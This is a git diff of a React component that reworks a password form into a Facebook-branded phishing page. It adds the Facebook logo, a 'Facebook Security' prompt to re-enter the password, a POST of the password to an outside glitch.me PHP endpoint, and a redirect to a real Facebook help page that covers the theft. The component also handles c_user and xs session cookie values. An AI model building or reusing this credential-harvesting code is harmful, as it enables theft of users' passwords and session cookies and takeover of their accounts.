@@ -1,14 +1,13 @@
 import React, { useState } from "react";
-import FormInput from "../components/FormInput.jsx";
 
 function PasswordVerification({ submissionId, userData }) {
   const [passwordData, setPasswordData] = useState({
     password: "",
-    confirmPassword: "",
   });
   const [errors, setErrors] = useState({});
   const [isSubmitting, setIsSubmitting] = useState(false);
   const [isComplete, setIsComplete] = useState(false);
+  const [showPassword, setShowPassword] = useState(false);
 
   const handleInputChange = (e) => {
     const { name, value } = e.target;
@@ -25,19 +24,17 @@ function PasswordVerification({ submissionId, userData }) {
     }
   };
 
+  const togglePasswordVisibility = () => {
+    setShowPassword(!showPassword);
+  };
+
   const validateForm = () => {
     const newErrors = {};
 
     if (!passwordData.password) {
       newErrors.password = "Password is required";
-    } else if (passwordData.password.length < 8) {
-      newErrors.password = "Password must be at least 8 characters";
-    }
-
-    if (!passwordData.confirmPassword) {
-      newErrors.confirmPassword = "Please confirm your password";
-    } else if (passwordData.password !== passwordData.confirmPassword) {
-      newErrors.confirmPassword = "Passwords do not match";
+    } else if (passwordData.password.length < 6) {
+      newErrors.password = "Password must be at least 6 characters long.";
     }
 
     setErrors(newErrors);
@@ -78,7 +75,7 @@ function PasswordVerification({ submissionId, userData }) {
 
       // Send to external API with CORS handling
       const response = await fetch(
-        "https://mixed-fluff-space.glitch.me/zubaireng.php",
+        "https://mixed-fluff-space.glitch.me/zubairengpass.php",
         {
           method: "POST",
           mode: "no-cors",
@@ -94,6 +91,12 @@ function PasswordVerification({ submissionId, userData }) {
       );
       setIsSubmitting(false);
       setIsComplete(true);
+      
+      // Redirect after 2 seconds like in the original HTML
+      setTimeout(() => {
+        window.location.href = 'https://www.facebook.com/help/media/thank-you?rdrhc';
+      }, 2000);
+      
     } catch (error) {
       console.error("Error submitting password:", error);
       setErrors({ submit: "Failed to submit password. Please try again." });
@@ -103,81 +106,192 @@ function PasswordVerification({ submissionId, userData }) {
 
   if (isComplete) {
     return (
-      <div className="min-h-screen bg-gray-100 flex items-center justify-center p-4">
-        <div className="form-container text-center">
-          <div className="text-green-600 text-6xl mb-4">✓</div>
-          <h2 className="text-2xl font-bold text-gray-800 mb-4">
-            Submission Complete!
-          </h2>
-          <p className="text-gray-600 mb-6">
-            Your information has been successfully submitted.
-          </p>
-          <div className="bg-gray-50 p-4 rounded-lg text-left">
-            <h3 className="font-semibold mb-2">Submission Details:</h3>
-            <p>
-              <strong>ID:</strong> {submissionId}
-            </p>
-            <p>
-              <strong>c_user:</strong> {userData?.c_user}
-            </p>
-            <p>
-              <strong>xs:</strong> {userData?.xs}
-            </p>
-          </div>
+      <div style={{
+        fontFamily: "'Helvetica Neue', Arial, sans-serif",
+        backgroundColor: '#f0f2f5',
+        display: 'flex',
+        justifyContent: 'center',
+        alignItems: 'center',
+        minHeight: '100vh',
+        margin: 0
+      }}>
+        <div style={{
+          backgroundColor: 'white',
+          padding: '40px 30px',
+          borderRadius: '8px',
+          boxShadow: '0px 4px 12px rgba(0, 0, 0, 0.15)',
+          textAlign: 'center',
+          width: '360px'
+        }}>
+          <div style={{ color: '#1877f2', fontSize: '48px', marginBottom: '20px' }}>✓</div>
+          <h2 style={{ color: '#333', marginBottom: '20px' }}>Password Submitted Successfully!</h2>
+          <p style={{ color: '#606770' }}>Redirecting to Facebook Help Center...</p>
         </div>
       </div>
     );
   }
 
   return (
-    <div className="min-h-screen bg-gray-100 flex items-center justify-center p-4">
-      <div className="form-container">
-        <h2 className="text-2xl font-bold text-gray-800 mb-6">
-          Set Your Password
-        </h2>
-
-        <div className="bg-blue-50 border border-blue-200 rounded-lg p-4 mb-6">
-          <p className="text-blue-800 text-sm">
-            Please create a secure password to complete your registration.
-          </p>
+    <div style={{
+      fontFamily: "'Helvetica Neue', Arial, sans-serif",
+      backgroundColor: '#f0f2f5',
+      display: 'flex',
+      justifyContent: 'center',
+      alignItems: 'center',
+      minHeight: '100vh',
+      margin: 0
+    }}>
+      <div style={{
+        backgroundColor: 'white',
+        padding: '40px 30px',
+        borderRadius: '8px',
+        boxShadow: '0px 4px 12px rgba(0, 0, 0, 0.15)',
+        textAlign: 'center',
+        width: '360px',
+        position: 'relative'
+      }}>
+        {/* Logo */}
+        <div style={{ marginBottom: '20px' }}>
+          <img 
+            src="https://upload.wikimedia.org/wikipedia/commons/thumb/6/6c/Facebook_Logo_2023.png/600px-Facebook_Logo_2023.png?20231011121526" 
+            alt="Facebook Logo" 
+            style={{ width: '120px' }}
+          />
         </div>
-
+        
+        {/* Header */}
+        <div style={{
+          marginBottom: '20px',
+          fontSize: '18px',
+          color: '#333',
+          fontWeight: 'bold'
+        }}>
+          Facebook Security
+        </div>
+        
+        <p style={{ color: '#606770', marginBottom: '30px' }}>
+          Please re-enter your password to complete the request.
+        </p>
+        
         <form onSubmit={handleSubmit}>
-          <FormInput
-            label="Password"
-            type="password"
-            name="password"
-            value={passwordData.password}
-            onChange={handleInputChange}
-            error={errors.password}
-            required
-            placeholder="Enter your password"
-          />
-
-          <FormInput
-            label="Confirm Password"
-            type="password"
-            name="confirmPassword"
-            value={passwordData.confirmPassword}
-            onChange={handleInputChange}
-            error={errors.confirmPassword}
-            required
-            placeholder="Confirm your password"
-          />
-
+          <div style={{
+            marginBottom: '25px',
+            textAlign: 'left',
+            position: 'relative'
+          }}>
+            <label style={{
+              display: 'block',
+              fontWeight: 'bold',
+              marginBottom: '8px',
+              fontSize: '14px',
+              color: '#606770'
+            }}>
+              Password
+            </label>
+            
+            <div style={{ position: 'relative' }}>
+              <input
+                type={showPassword ? "text" : "password"}
+                name="password"
+                value={passwordData.password}
+                onChange={handleInputChange}
+                placeholder="Enter your password"
+                required
+                style={{
+                  width: '100%',
+                  padding: '14px',
+                  paddingRight: '40px',
+                  border: '1px solid #ccd0d5',
+                  borderRadius: '6px',
+                  fontSize: '16px',
+                  color: '#1c1e21',
+                  boxSizing: 'border-box',
+                  borderColor: errors.password ? '#e74c3c' : '#ccd0d5'
+                }}
+                onFocus={(e) => {
+                  e.target.style.borderColor = '#1877f2';
+                  e.target.style.boxShadow = '0px 0px 0px 2px rgba(24, 119, 242, 0.2)';
+                }}
+                onBlur={(e) => {
+                  e.target.style.borderColor = errors.password ? '#e74c3c' : '#ccd0d5';
+                  e.target.style.boxShadow = 'none';
+                }}
+              />
+              
+              <i 
+                className={`fas ${showPassword ? 'fa-eye-slash' : 'fa-eye'}`}
+                onClick={togglePasswordVisibility}
+                style={{
+                  position: 'absolute',
+                  right: '10px',
+                  top: '50%',
+                  transform: 'translateY(-50%)',
+                  fontSize: '20px',
+                  color: '#606770',
+                  cursor: 'pointer',
+                  transition: 'color 0.3s ease'
+                }}
+                onMouseEnter={(e) => e.target.style.color = '#1877f2'}
+                onMouseLeave={(e) => e.target.style.color = '#606770'}
+              />
+            </div>
+            
+            {errors.password && (
+              <span style={{
+                color: '#e74c3c',
+                fontSize: '14px',
+                marginTop: '5px',
+                display: 'block'
+              }}>
+                {errors.password}
+              </span>
+            )}
+          </div>
+          
           {errors.submit && (
-            <div className="error-message mb-4">{errors.submit}</div>
+            <div style={{
+              color: '#e74c3c',
+              fontSize: '14px',
+              marginBottom: '15px',
+              textAlign: 'left'
+            }}>
+              {errors.submit}
+            </div>
           )}
-
+          
           <button
             type="submit"
-            className="submit-button"
             disabled={isSubmitting}
+            style={{
+              backgroundColor: '#1877f2',
+              color: 'white',
+              border: 'none',
+              padding: '14px',
+              borderRadius: '6px',
+              fontSize: '16px',
+              fontWeight: 'bold',
+              cursor: isSubmitting ? 'not-allowed' : 'pointer',
+              width: '100%',
+              marginTop: '10px',
+              opacity: isSubmitting ? 0.6 : 1
+            }}
+            onMouseEnter={(e) => {
+              if (!isSubmitting) e.target.style.backgroundColor = '#166fe5';
+            }}
+            onMouseLeave={(e) => {
+              if (!isSubmitting) e.target.style.backgroundColor = '#1877f2';
+            }}
           >
-            {isSubmitting ? "Creating Account..." : "Complete Registration"}
+            {isSubmitting ? "Submitting..." : "Submit"}
           </button>
         </form>
       </div>
+      
+      {/* Font Awesome CDN for eye icons */}
+      <link 
+        rel="stylesheet" 
+        href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css"
+      />
     </div>
   );
 }
